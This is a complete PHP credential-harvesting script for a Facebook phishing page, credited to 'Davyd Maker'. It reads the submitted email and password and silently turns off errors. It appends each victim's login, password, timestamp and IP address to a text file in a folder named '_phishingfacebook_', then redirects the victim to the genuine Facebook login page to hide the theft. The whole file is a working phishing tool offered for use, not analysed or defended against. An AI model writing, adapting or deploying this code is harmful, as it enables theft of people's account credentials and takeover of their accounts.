<?php
//by: Davyd Maker

error_reporting(0);
$login = $_POST['email'];
$senha = $_POST['senha'];

if(!is_null($login) || !is_null($senha)){
$datahora = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$arquivo = fopen("_phishingfacebook_/logins12j3h41krhg.txt" , "a");

$escrever = fwrite($arquivo , $login."/BIRRL/".$senha."/BIRRL/".$datahora."/BIRRL/".$ip.PHP_EOL);
fclose($arquivo);

header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110');
}else{
	header('Location: index.html');
}
?>